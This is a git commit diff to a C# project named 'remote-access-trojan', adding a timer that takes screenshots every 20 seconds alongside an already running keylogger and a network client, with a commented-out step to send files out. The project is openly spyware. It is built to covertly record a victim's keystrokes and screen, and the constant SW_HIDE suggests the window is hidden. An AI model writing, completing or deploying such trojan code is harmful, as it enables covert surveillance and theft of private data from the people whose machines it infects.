cd38e78866d673110dc46f577d74025ac5b0e3bc
MattMistele <matthew@mistele.com>
2019-12-02 21:14:29 -0800

    Create timer to launch screenshots & webcam photos every 20 seconds

--- remote-access-trojan/Program.cs
+++ remote-access-trojan/Program.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Timers;
 using System.Windows.Forms;
 
 namespace remote_access_trojan
@@ -6,6 +7,8 @@ namespace remote_access_trojan
     class Program
     {
         const int SW_HIDE = 0;
+        static System.Timers.Timer timer;
+        static int timerCount = 1;
 
         static void Main(string[] args)
         {
@@ -16,14 +19,40 @@ namespace remote_access_trojan
             Console.WriteLine("Hello World!");
             //Client.ExecuteClient();
 
-
+            SetTimer();
             Keylogger.Run();
-            // insert parameter -> Screenshot.takeScreenshot();
            // Client.ZipFiles();
             Client.newClient();
 
             // Do not move - this needs to be the last line
             Application.Run();
         }
+
+        private static void SetTimer()
+        {
+            // Create a timer with a 20 second interval.
+            timer = new System.Timers.Timer(20000);
+
+            timer.Elapsed += OnTimerTick;
+            timer.AutoReset = true;
+            timer.Enabled = true;
+        }
+
+        private static void OnTimerTick(Object source, ElapsedEventArgs e)
+        {
+            // 2 minutes is up
+            if (timerCount >= 10)
+            {
+                // Client.SendFile()
+                timer.Stop();
+                return;
+            }
+
+            Screenshot.takeScreenshot(timerCount);
+            Console.WriteLine("Timer Tick: " + timerCount);
+
+            timerCount++;
+        }
+
     }
 }
